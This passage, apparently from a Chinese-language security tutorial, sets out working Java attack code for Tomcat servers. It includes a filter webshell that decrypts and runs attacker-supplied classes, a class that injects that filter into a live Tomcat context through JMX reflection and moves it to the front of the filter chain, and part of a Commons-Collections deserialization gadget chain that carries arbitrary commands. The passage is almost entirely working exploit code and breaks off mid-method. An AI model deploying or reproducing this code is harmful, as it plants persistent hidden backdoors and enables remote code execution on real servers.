                    String k="1a1dc91c907325c6";
                    HttpSession session = ((HttpServletRequest) req).getSession();
                    session.putValue("u",k);
                    Cipher c = Cipher.getInstance("AES");
                    c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
                    String reader = req.getReader().readLine();
                    System.out.println(reader);
    //                byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(req.getReader().readLine()));
                    byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(reader));
                    Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
    //                Class evilClass = Class.forName("net.rebeyond.behinder.payload.java.BasicInfo");
                    Object a = evilClass.newInstance();
                    Method b = evilClass.getDeclaredMethod("fuck", String.class, ServletRequest.class, ServletResponse.class, HttpSession.class);
                    b.invoke(a, k,req, resp,session);
                    return;
                }
            } catch (Exception e) {
                e.printStackTrace();//实际中这里注释掉 调试用
            }
            chain.doFilter(req, resp);
        }
        public void init(FilterConfig config) throws ServletException {
        }
    }
我们将Myfilter 转换成byte[] inject_tomcat 中直接defineclass调用 injectwebshell_tomcat如下
    import javax.management.MBeanServer;
    import com.sun.jmx.mbeanserver.NamedObject;
    import org.apache.catalina.core.StandardContext;
    import org.apache.tomcat.util.modeler.Registry;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.Method;
    import java.util.HashMap;
    import java.util.Iterator;
    import java.util.Map;
    import javax.servlet.Filter;
    import javax.servlet.ServletContext;
    import javax.servlet.http.HttpServletResponse;
    public class Injectwebshell_tomcat {
    ? ? public static String url;
    ? ? public static String password;
    ? ? public Injectwebshell_tomcat() {}
    ? ? static{
    ? ? ? ? System.out.println("ffffffffffffffffffffffffffffffffffffff");
    ? ? ? ? String filterUrlPattern = "/*";
    ? ? ? ? String filterName = "233333";
    ? ? ? ? String password = "pass";
    ? ? ? ? try {
    ? ? ? ? ? ? MBeanServer mBeanServer = Registry.getRegistry(null, null).getMBeanServer();
    ? ? ? ? ? ? // 获取mbsInterceptor
    ? ? ? ? ? ? Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
    ? ? ? ? ? ? field.setAccessible(true);
    ? ? ? ? ? ? Object mbsInterceptor = field.get(mBeanServer);
    ? ? ? ? ? ? // 获取repository
    ? ? ? ? ? ? field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
    ? ? ? ? ? ? field.setAccessible(true);
    ? ? ? ? ? ? Object repository = field.get(mbsInterceptor);
    ? ? ? ? ? ? // 获取domainTb
    ? ? ? ? ? ? field = Class.forName("com.sun.jmx.mbeanserver.Repository").getDeclaredField("domainTb");
    ? ? ? ? ? ? field.setAccessible(true);
    ? ? ? ? ? ? HashMap> domainTb = (HashMap>)field.get(repository);
    ? ? ? ? ? ? HashMap aaa = (HashMap) domainTb.get("Catalina");
    ? ? ? ? ? ? String keyNonLoginAuthenticator = "context=/bx_test_war_exploded,host=localhost,name=NonLoginAuthenticator,type=Valve";
    //
    //? ? ? ? ? ? Iterator it = aaa.keySet().iterator();
    //? ? ? ? ? ? while(it.hasNext()) {
    //? ? ? ? ? ? ? ? String key = it.next();
    //? ? ? ? ? ? ? ? System.out.println(key + " : " + aaa.get(key));
    //? ? ? ? ? ? ? ? response.getWriter().println(key + " : " + aaa.get(key));
    //? ? ? ? ? ? ? ? if(key.contains("NonLoginAuthenticator")){
    //? ? ? ? ? ? ? ? ? ? keyNonLoginAuthenticator = key;
    //? ? ? ? ? ? ? ? }
    //? ? ? ? ? ? }
    ? ? ? ? ? ? // 获取domain
    ? ? ? ? ? ? NamedObject nonLoginAuthenticator = domainTb.get("Catalina").get(keyNonLoginAuthenticator);
    ? ? ? ? ? ? field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
    ? ? ? ? ? ? field.setAccessible(true);
    ? ? ? ? ? ? Object object = field.get(nonLoginAuthenticator);
    ? ? ? ? ? ? // 获取resource
    ? ? ? ? ? ? field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
    ? ? ? ? ? ? field.setAccessible(true);
    ? ? ? ? ? ? Object resource = field.get(object);
    ? ? ? ? ? ? // 获取context
    ? ? ? ? ? ? field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
    ? ? ? ? ? ? field.setAccessible(true);
    ? ? ? ? ? ? StandardContext standardContext = (StandardContext) field.get(resource);
    ? ? ? ? ? ? // 获取servletContext
    ? ? ? ? ? ? field = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
    ? ? ? ? ? ? field.setAccessible(true);
    ? ? ? ? ? ? ServletContext servletContext = (ServletContext) field.get(standardContext);
    ? ? ? ? ? ? if (standardContext != null) {
    ? ? ? ? ? ? ? ? //修改状态，要不然添加不了
    ? ? ? ? ? ? ? ? Field stateField = org.apache.catalina.util.LifecycleBase.class
    ? ? ? ? ? ? ? ? ? ? ? ? .getDeclaredField("state");
    ? ? ? ? ? ? ? ? stateField.setAccessible(true);
    ? ? ? ? ? ? ? ? stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
    ? ? ? ? ? ? ? ? //创建一个自定义的Filter马
    ? ? ? ? ? ? ? ? byte[] MFbytes = new byte[]{Myfilter 的 bytes};
    ? ? ? ? ? ? ? ? java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",new Class[]{byte[].class, int.class, int.class});
    ? ? ? ? ? ? ? ? defineClassMethod.setAccessible(true);
    ? ? ? ? ? ? ? ? Class myclass = (Class) defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(),? MFbytes, 0, MFbytes.length);
    ? ? ? ? ? ? ? ? Constructor MFconstructor = myclass.getConstructor();
    ? ? ? ? ? ? ? ? MFconstructor.setAccessible(true);
    ? ? ? ? ? ? ? ? Filter my_filter = (Filter) MFconstructor.newInstance();
    ? ? ? ? ? ? ? ? //添加filter马
    ? ? ? ? ? ? ? ? javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter(filterName, my_filter);
    ? ? ? ? ? ? ? ? filterRegistration.setInitParameter("encoding", "utf-8");
    ? ? ? ? ? ? ? ? filterRegistration.setAsyncSupported(false);
    ? ? ? ? ? ? ? ? filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,new String[]{filterUrlPattern});
    ? ? ? ? ? ? ? ? //状态恢复，要不然服务不可用
    ? ? ? ? ? ? ? ? if (stateField != null) {
    ? ? ? ? ? ? ? ? ? ? stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
    ? ? ? ? ? ? ? ? }
    ? ? ? ? ? ? ? ? if (standardContext != null) {
    ? ? ? ? ? ? ? ? ? ? //生效filter
    ? ? ? ? ? ? ? ? ? ? Method filterStartMethod = StandardContext.class
    ? ? ? ? ? ? ? ? ? ? ? ? ? ? .getMethod("filterStart");
    ? ? ? ? ? ? ? ? ? ? filterStartMethod.setAccessible(true);
    ? ? ? ? ? ? ? ? ? ? filterStartMethod.invoke(standardContext, null);
    ? ? ? ? ? ? ? ? ? ? Class ccc = null;
    ? ? ? ? ? ? ? ? ? ? try {
    ? ? ? ? ? ? ? ? ? ? ? ? ccc = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
    ? ? ? ? ? ? ? ? ? ? } catch (Throwable t){}
    ? ? ? ? ? ? ? ? ? ? if (ccc == null) {
    ? ? ? ? ? ? ? ? ? ? ? ? try {
    ? ? ? ? ? ? ? ? ? ? ? ? ? ? ccc = Class.forName("org.apache.catalina.deploy.FilterMap");
    ? ? ? ? ? ? ? ? ? ? ? ? } catch (Throwable t){}
    ? ? ? ? ? ? ? ? ? ? }
    ? ? ? ? ? ? ? ? ? ? //把filter插到第一位
    ? ? ? ? ? ? ? ? ? ? Class c = Class.forName("org.apache.catalina.core.StandardContext");
    ? ? ? ? ? ? ? ? ? ? Method m = c.getMethod("findFilterMaps");
    ? ? ? ? ? ? ? ? ? ? Object[] filterMaps = (Object[]) m.invoke(standardContext);
    ? ? ? ? ? ? ? ? ? ? Object[] tmpFilterMaps = new Object[filterMaps.length];
    ? ? ? ? ? ? ? ? ? ? int index = 1;
    ? ? ? ? ? ? ? ? ? ? for (int i = 0; i < filterMaps.length; i++) {
    ? ? ? ? ? ? ? ? ? ? ? ? Object o = filterMaps[i];
    ? ? ? ? ? ? ? ? ? ? ? ? m = ccc.getMethod("getFilterName");
    ? ? ? ? ? ? ? ? ? ? ? ? String name = (String) m.invoke(o);
    ? ? ? ? ? ? ? ? ? ? ? ? if (name.equalsIgnoreCase(filterName)) {
    ? ? ? ? ? ? ? ? ? ? ? ? ? ? tmpFilterMaps[0] = o;
    ? ? ? ? ? ? ? ? ? ? ? ? } else {
    ? ? ? ? ? ? ? ? ? ? ? ? ? ? tmpFilterMaps[index++] = filterMaps[i];
    ? ? ? ? ? ? ? ? ? ? ? ? }
    ? ? ? ? ? ? ? ? ? ? }
    ? ? ? ? ? ? ? ? ? ? for (int i = 0; i < filterMaps.length; i++) {
    ? ? ? ? ? ? ? ? ? ? ? ? filterMaps[i] = tmpFilterMaps[i];
    ? ? ? ? ? ? ? ? ? ? }
    ? ? ? ? ? ? ? ? }
    ? ? ? ? ? ? }
    ? ? ? ? } catch (Exception e) {
    ? ? ? ? ? ? e.printStackTrace();
    ? ? ? ? }
    ? ? }
    }
构造CC代码如下
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
    import javassist.ClassClassPath;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InstantiateTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import javax.xml.transform.Templates;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.util.HashMap;
    import java.util.Map;
    public class cc3 {
        public static InvocationHandler getobject(String cmd) throws Exception {
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            CtClass cc = pool.makeClass("Cat");
    //        String cmd = "java.lang.Runtime.getRuntime().exec(\"open  /System/Applications/Calculator.app\");";
            // 创建 static 代码块，并插入代码
            cc.makeClassInitializer().insertBefore(cmd);
            String randomClassName = "EvilCat" + System.nanoTime();
            cc.setName(randomClassName);
            cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错
            // 写入.class 文件
            byte[] classBytes = cc.toBytecode();
            byte[][] targetByteCodes = new byte[][]{classBytes};
            TemplatesImpl templates = TemplatesImpl.class.newInstance();
            setFieldValue(templates, "_bytecodes", targetByteCodes);
            // 进入 defineTransletClasses() 方法需要的条件
            setFieldValue(templates, "_name", "name");
            setFieldValue(templates, "_class", null);
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
            });
            HashMap innermap = new HashMap();
            LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
            Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
            handler_constructor.setAccessible(true);
            InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler
            Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象
            Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            AnnotationInvocationHandler_Constructor.setAccessible(true);
            InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);
            return handler;
    //        try{
    //            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc3"));
    //            outputStream.writeObject(handler);
    //            outputStream.close();
    //
    //            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc3"));
    //            inputStream.readObject();
    //        }catch(Exception e){
    //            e.printStackTrace();